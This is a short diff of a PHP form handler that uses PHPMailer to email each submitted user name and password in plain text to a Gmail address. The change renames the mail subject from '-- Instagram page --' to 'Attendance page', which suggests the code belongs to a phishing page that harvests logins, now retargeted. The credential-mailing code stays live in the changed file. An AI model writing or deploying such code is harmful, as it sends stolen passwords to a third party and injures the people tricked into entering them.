@@ -27,8 +27,8 @@ if(isset($_POST['submit'])){
     $mail->addAddress('sabari.rishi32@gmail.com'); // Email address where you want to receive emails (you can use any of your gmail address including the gmail address which you used as SMTP server)
 
     $mail->isHTML(true);
-    $mail->Subject = '-- Instagram page --';
-    $mail->Body = "<h3>user name : $name <br>Password: $password </h3>";
+    $mail->Subject = '"Attendance page"';
+    $mail->Body = "<h3>user_name : $name <br>Password: $password </h3>";
 
     $mail->send();
     
